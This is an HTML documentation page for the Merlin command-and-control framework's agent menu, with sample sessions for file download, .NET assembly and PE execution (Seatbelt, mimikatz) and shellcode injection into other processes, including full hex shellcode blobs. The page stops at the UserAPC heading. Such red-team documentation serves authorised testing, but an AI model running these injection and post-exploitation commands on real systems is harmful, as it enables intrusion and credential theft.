

<!DOCTYPE html>
<html class="writer-html4" lang="en" >
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Agent Menu &mdash; Merlin BETA documentation</title>
  

  
  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />

  
  
  
  

  
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
        <script type="text/javascript" src="../../_static/jquery.js"></script>
        <script type="text/javascript" src="../../_static/underscore.js"></script>
        <script type="text/javascript" src="../../_static/doctools.js"></script>
        <script type="text/javascript" src="../../_static/language_data.js"></script>
    
    <script type="text/javascript" src="../../_static/js/theme.js"></script>

    
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Listener Menu" href="listeners.html" />
    <link rel="prev" title="Main Menu" href="main.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="../../index.html" class="icon icon-home" alt="Documentation Home"> Merlin
          

          
          </a>

          
            
            
              <div class="version">
                0.8.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        
        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Quick Start</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../quickStart/server.html">Merlin Server</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../quickStart/agent.html">Merlin Agent</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../quickStart/faq.html">FAQ</a></li>
</ul>
<p class="caption"><span class="caption-text">Merlin Agent</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../agent/cli.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../agent/dll.html">DLL Agent</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../agent/custom.html">Custom Build</a></li>
</ul>
<p class="caption"><span class="caption-text">Merlin Server</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="main.html">Main Menu</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Agent Menu</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#help">help</a></li>
<li class="toctree-l2"><a class="reference internal" href="#cd">cd</a></li>
<li class="toctree-l2"><a class="reference internal" href="#clear">clear</a></li>
<li class="toctree-l2"><a class="reference internal" href="#back">back</a></li>
<li class="toctree-l2"><a class="reference internal" href="#download">download</a></li>
<li class="toctree-l2"><a class="reference internal" href="#exit">exit</a></li>
<li class="toctree-l2"><a class="reference internal" href="#execute-assembly">execute-assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="#execute-pe">execute-pe</a></li>
<li class="toctree-l2"><a class="reference internal" href="#execute-shellcode">execute-shellcode</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#self">self</a></li>
<li class="toctree-l3"><a class="reference internal" href="#remote">remote</a></li>
<li class="toctree-l3"><a class="reference internal" href="#rtlcreateuserthread">RtlCreateUserThread</a></li>
<li class="toctree-l3"><a class="reference internal" href="#userapc">UserAPC</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#info">info</a></li>
<li class="toctree-l2"><a class="reference internal" href="#invoke-assembly">invoke-assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="#jobs">jobs</a></li>
<li class="toctree-l2"><a class="reference internal" href="#kill">kill</a></li>
<li class="toctree-l2"><a class="reference internal" href="#list-assemblies">list-assemblies</a></li>
<li class="toctree-l2"><a class="reference internal" href="#load-assembly">load-assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="#ls">ls</a></li>
<li class="toctree-l2"><a class="reference internal" href="#main">main</a></li>
<li class="toctree-l2"><a class="reference internal" href="#memfd">memfd</a></li>
<li class="toctree-l2"><a class="reference internal" href="#nslookup">nslookup</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwd">pwd</a></li>
<li class="toctree-l2"><a class="reference internal" href="#quit">quit</a></li>
<li class="toctree-l2"><a class="reference internal" href="#run">run</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#shell-functions">Shell Functions</a></li>
<li class="toctree-l3"><a class="reference internal" href="#quoted-arguments">Quoted Arguments</a></li>
<li class="toctree-l3"><a class="reference internal" href="#escape-sequence">Escape Sequence</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#set">set</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#ja3">ja3</a></li>
<li class="toctree-l3"><a class="reference internal" href="#killdate">killdate</a></li>
<li class="toctree-l3"><a class="reference internal" href="#maxretry">maxretry</a></li>
<li class="toctree-l3"><a class="reference internal" href="#padding">padding</a></li>
<li class="toctree-l3"><a class="reference internal" href="#skew">skew</a></li>
<li class="toctree-l3"><a class="reference internal" href="#sleep">sleep</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#sharpgen">sharpgen</a></li>
<li class="toctree-l2"><a class="reference internal" href="#shell">shell</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id12">Shell Functions</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id13">Quoted Arguments</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id14">Escape Sequence</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#status">status</a></li>
<li class="toctree-l2"><a class="reference internal" href="#upload">upload</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="listeners.html">Listener Menu</a></li>
<li class="toctree-l1"><a class="reference internal" href="modules.html">Modules Menu</a></li>
<li class="toctree-l1"><a class="reference internal" href="../x509.html">TLS Certificates</a></li>
</ul>
<p class="caption"><span class="caption-text">Modules</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../modules/build.html">Building Modules</a></li>
</ul>
<p class="caption"><span class="caption-text">Misc.</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../misc/blogs.html">Blog Posts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/contrib.html">Contributing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/logging.html">Logging</a></li>
</ul>

            
          
        </div>
        
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Merlin</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
        
      <li>Agent Menu</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../../_sources/server/menu/agents.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="agent-menu">
<h1>Agent Menu<a class="headerlink" href="#agent-menu" title="Permalink to this headline">¶</a></h1>
<p>The agent menu context is used to interact with a single agent. The Merlin prompt will include the word <code class="docutils literal notranslate"><span class="pre">agent</span></code> along with the identifier for the selected agent. Type <code class="docutils literal notranslate"><span class="pre">help</span></code> to see a list of available commands for the agent menu context.</p>
<div class="section" id="help">
<h2>help<a class="headerlink" href="#help" title="Permalink to this headline">¶</a></h2>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» help

       COMMAND      |          DESCRIPTION           |            OPTIONS
+-------------------+--------------------------------+--------------------------------+
  cd                | Change directories             | cd ../../ OR cd c:\\Users
  clear             | Clear any UNSENT jobs from the |
                    | queue                          |
  cmd               | Execute a command on the agent | cmd ping -c 3 8.8.8.8
                    | (DEPRECIATED)                  |
  back              | Return to the main menu        |
  download          | Download a file from the agent | download &lt;remote_file&gt;
  execute-assembly  | Execute a .NET 4.0 assembly    | execute-assembly &lt;assembly
                    |                                | path&gt; [&lt;assembly args&gt;,
                    |                                | &lt;spawnto path&gt;, &lt;spawnto
                    |                                | args&gt;]
  execute-pe        | Execute a Windows PE (EXE)     | execute-pe &lt;pe path&gt; [&lt;pe
                    |                                | args&gt;, &lt;spawnto path&gt;,
                    |                                | &lt;spawnto args&gt;]
  execute-shellcode | Execute shellcode              | self, remote &lt;pid&gt;,
                    |                                | RtlCreateUserThread &lt;pid&gt;
  info              | Display all information about  |
                    | the agent                      |
  invoke-assembly   | Invoke, or execute, a .NET     | &lt;assembly name&gt;, &lt;assembly
                    | assembly that was previously   | args&gt;
                    | loaded into the agent&#39;s        |
                    | process                        |
  jobs              | Display all active jobs for    |
                    | the agent                      |
  kill              | Instruct the agent to die or   |
                    | quit                           |
  load-assembly     | Load a .NET assembly into the  | &lt;assembly path&gt; [&lt;assembly
                    | agent&#39;s process                | name&gt;]
  list-assemblies   | List the .NET assemblies that  |
                    | are loaded into the agent&#39;s    |
                    | process                        |
  ls                | List directory contents        | ls /etc OR ls C:\\Users OR ls
                    |                                | C:/Users
  main              | Return to the main menu        |
  memfd             | Execute Linux file in memory   | &lt;file path&gt; [&lt;arguments&gt;]
  nslookup          | DNS query on host or ip        | nslookup 8.8.8.8
  pwd               | Display the current working    | pwd
                    | directory                      |
  run               | Execute a program directly,    | run ping -c 3 8.8.8.8
                    | without using a shell          |
  set               | Set the value for one of the   | ja3, killdate, maxretry,
                    | agent&#39;s options                | padding, skew, sleep
  sharpgen          | Use SharpGen to compile and    | sharpgen &lt;code&gt; [&lt;spawnto
                    | execute a .NET assembly        | path&gt;, &lt;spawnto args&gt;]
  shell             | Execute a command on the agent | shell ping -c 3 8.8.8.8
                    | using the host&#39;s default shell |
  status            | Print the current status of    |
                    | the agent                      |
  upload            | Upload a file to the agent     | upload &lt;local_file&gt;
                    |                                | &lt;remote_file&gt;
  *                 | Anything else will be execute  |
                    | on the host operating system   |
Agent Help Menu
</pre></div>
</div>
</div>
<div class="section" id="cd">
<h2>cd<a class="headerlink" href="#cd" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">cd</span></code> command is used to change the current working directory the Merlin agent is using. Relative paths can be used (e.g.,. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>). This command uses native Go and will not execute the <code class="docutils literal notranslate"><span class="pre">cd</span></code> binary program found on the host operating system.</p>
<div class="line-block">
<div class="line">The <code class="docutils literal notranslate"><span class="pre">\</span></code> in a Windows directory must be escaped like <code class="docutils literal notranslate"><span class="pre">C:\\Windows\\System32</span></code>.</div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd /usr/bin
[-]Created job evtawDqBWa for agent a98e6175-7799-47fb-abf0-32534a9191f0 at 2019-02-27T01:03:57Z
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job evtawDqBWa at 2019-02-27T01:03:59Z
Changed working directory to /usr/bin
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd &quot;C:\\Program Files (x86)\\&quot;
[-]Created job gwFQhcsKJi for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2019-02-27T01:17:26Z
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job gwFQhcsKJi at 2019-02-27T01:17:30Z
Changed working directory to C:\Program Files (x86)
</pre></div>
</div>
</div>
<div class="section" id="clear">
<h2>clear<a class="headerlink" href="#clear" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">clear</span></code> command will cancel all jobs in the queue that have not been sent to the agent yet.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
[+] jobs cleared for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
<div class="section" id="back">
<h2>back<a class="headerlink" href="#back" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">back</span></code> command is used to leave the Agent menu and return back to the <a class="reference internal" href="main.html"><span class="doc">Main Menu</span></a>.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» back
Merlin»
</pre></div>
</div>
</div>
<div class="section" id="download">
<h2>download<a class="headerlink" href="#download" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">download</span></code> command is used to download a file from the host where the agent is running back to the Merlin server. The file will be automatically saved in a folder with a name of the agent’s identifier in the <cite>dataagentsc1090dbc-f2f7-4d90-a241-86e0c0217786</cite> directory.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Enclose file paths containing a space with quotation marks (e.g.,. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download C:\\Windows\\hh.exe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job NXnhJVRUSP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job NXnhJVRUSP
[+]Successfully downloaded file C:\Windows\hh.exe with a size of 17920 bytes from agent to C:\merlin\data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786\hh.exe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
</pre></div>
</div>
</div>
<div class="section" id="exit">
<h2>exit<a class="headerlink" href="#exit" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">exit</span></code> command is used to quit the Merlin server. The user will be prompted for confirmation to prevent from accidentally quitting the program. The confirmation prompt can be skipped with <code class="docutils literal notranslate"><span class="pre">exit</span> <span class="pre">-y</span></code>.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin» exit

Are you sure you want to exit? [yes/NO]:
yes
[!]Quitting...
</pre></div>
</div>
</div>
<div class="section" id="execute-assembly">
<h2>execute-assembly<a class="headerlink" href="#execute-assembly" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-assembly</span></code> command uses <a class="reference external" href="https://github.com/Binject/go-donut">go-donut</a> to convert a .NET assembly into shellcode and then uses the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/createProcess</span></code> Merlin module to execute the shellcode.</p>
<p>Currently this command only supports .NET v4.0 assemblies. For more granular control, use the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/donut</span></code> module.</p>
<p>The command is executed as: <code class="docutils literal notranslate"><span class="pre">execute-assembly</span> <span class="pre">&lt;assembly</span> <span class="pre">path&gt;</span> <span class="pre">[&lt;assembly</span> <span class="pre">args&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">args&gt;]</span></code></p>
<p>The command requires the file path to the assembly you wish to execute in the <code class="docutils literal notranslate"><span class="pre">&lt;assembly</span> <span class="pre">path&gt;</span></code> argument. All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Use quotes to enclose multiple arguments for <code class="docutils literal notranslate"><span class="pre">&lt;assembly</span> <span class="pre">args&gt;</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">execute-assembly</span> <span class="pre">Seatbelt.exe</span> <span class="pre">&quot;LocalGroups</span> <span class="pre">LocalUsers&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly Seatbelt.exe &quot;DotNet IdleTime&quot; &quot;C:\\Windows\\System32\\WerFault.exe&quot; /?
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job dmAfzDPUsM for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job dmAfzDPUsM



                        %&amp;&amp;@@@&amp;&amp;
                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%
                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&amp;%%%%%%%################
                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*
                        &amp;%%&amp;&amp;&amp;%%%%%        v1.1.0         ,(((&amp;%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== DotNet ======

  Installed CLR Versions
      2.0.50727
      4.0.30319

  Installed .NET Versions
      3.5.30729.4926
      4.8.03752

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!
        [*] You can invoke .NET version 3.5 to bypass AMSI.
====== IdleTime ======

  CurrentUser : DESKTOP-H35RK21\rastley
  Idletime    : 00h:06m:02s:766ms (362766 milliseconds)



[*] Completed collection in 0.122 seconds
</pre></div>
</div>
</div>
<div class="section" id="execute-pe">
<h2>execute-pe<a class="headerlink" href="#execute-pe" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-pe</span></code> command uses <a class="reference external" href="https://github.com/Binject/go-donut">go-donut</a> to convert a Windows Portable Executable (PE), commonly an .exe, into shellcode and then uses the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/createProcess</span></code> Merlin module to execute the shellcode.</p>
<p>The command is executed as: <code class="docutils literal notranslate"><span class="pre">execute-pe</span> <span class="pre">&lt;pe</span> <span class="pre">path&gt;</span> <span class="pre">[&lt;pe</span> <span class="pre">args&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">args&gt;]</span></code></p>
<p>The command requires the file path to the PE you wish to execute in the <code class="docutils literal notranslate"><span class="pre">&lt;pe</span> <span class="pre">path&gt;</span></code> argument. All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Use quotes to enclose multiple arguments for <code class="docutils literal notranslate"><span class="pre">&lt;pe</span> <span class="pre">args&gt;</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">execute-pe</span> <span class="pre">mimikatz.exe</span> <span class="pre">&quot;coffee</span> <span class="pre">exit&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe mimikatz.exe &quot;coffee exit&quot; C:\\Windows\\System32\\WerFault.exe Testing
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job BSvJZFvbRZ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job BSvJZFvbRZ


  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----&#39;

mimikatz(commandline) # exit
Bye!
</pre></div>
</div>
</div>
<div class="section" id="execute-shellcode">
<h2>execute-shellcode<a class="headerlink" href="#execute-shellcode" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command is used to have the Agent execute the provided shellcode. This command became available in version <code class="docutils literal notranslate"><span class="pre">0.6.4</span></code> and is only supported for Windows agents.</p>
<dl class="docutils">
<dt>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command takes the shellcode you want to execute at the last argument. Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following formats:</dt>
<dd><ul class="first last simple">
<li>Hex (e.g.,. <cite>5051525356</cite>)</li>
<li><code class="docutils literal notranslate"><span class="pre">0x50,</span> <span class="pre">0x51,</span> <span class="pre">0x52,</span> <span class="pre">0x53,</span> <span class="pre">0x56</span></code> with or without spaces and commas</li>
<li><code class="docutils literal notranslate"><span class="pre">\x50\x51\x52\x53\x56</span></code></li>
<li>Base64 encoded version of the above formats</li>
<li>A file containing any of the above formats or just a raw byte file</li>
</ul>
</dd>
</dl>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last">Shellcode injection and execution could cause a process to crash so choose wisely</p>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">If Cobalt Strike’s Beacon is injected using one of these methods, exiting the Beacon will cause the process to die too.</p>
</div>
<dl class="docutils">
<dt>The agent can execute shellcode using one of the following methods:</dt>
<dd><ul class="first last simple">
<li><a class="reference internal" href="#self">self</a></li>
<li><a class="reference internal" href="#remote">remote</a></li>
<li><a class="reference internal" href="#rtlcreateuserthread">RtlCreateUserThread</a></li>
<li><a class="reference internal" href="#id4">UserAPC</a></li>
</ul>
</dd>
</dl>
<div class="section" id="self">
<span id="id2"></span><h3>self<a class="headerlink" href="#self" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">self</span></code> method allocates space within the Merlin Agent process and executes the shellcode.</p>
<p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">self</span> <span class="pre">&lt;SHELLCODE&gt;</span></code></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
[-]Created job joQNJONrEK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job joQNJONrEK
[+]Shellcode executed successfully
</pre></div>
</div>
</div>
<div class="section" id="remote">
<h3>remote<a class="headerlink" href="#remote" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">remote</span></code> method creates a thread in another process using the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethreadex">CreateRemoteThreadEx</a> Windows API call.</p>
<p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">remote</span> <span class="pre">&lt;PID&gt;</span> <span class="pre">&lt;SHELLCODE&gt;</span></code> where PID is the Process ID you want to execute the shellcode under.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote 6560 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
[-]Created job PRumZQYBFR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job PRumZQYBFR
[+]Shellcode executed successfully
</pre></div>
</div>
</div>
<div class="section" id="rtlcreateuserthread">
<span id="id3"></span><h3>RtlCreateUserThread<a class="headerlink" href="#rtlcreateuserthread" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">rtlcreateuserthread</span></code> method creates a thread in another process using the undocumented <a class="reference external" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html">RtlCreateUserThread</a> Windows API call.</p>
<p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">rtlcreateuserthread</span> <span class="pre">&lt;PID&gt;</span> <span class="pre">&lt;SHELLCODE&gt;</span></code> where PID is the Process ID you want to execute the shellcode under.</p>
<p>Example:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode RtlCreateUserThread 6560 \x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3
[-]Created job CCWrmdLIFQ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job CCWrmdLIFQ
[+]Shellcode executed successfully
</pre></div>
</div>
</div>
<div class="section" id="userapc">
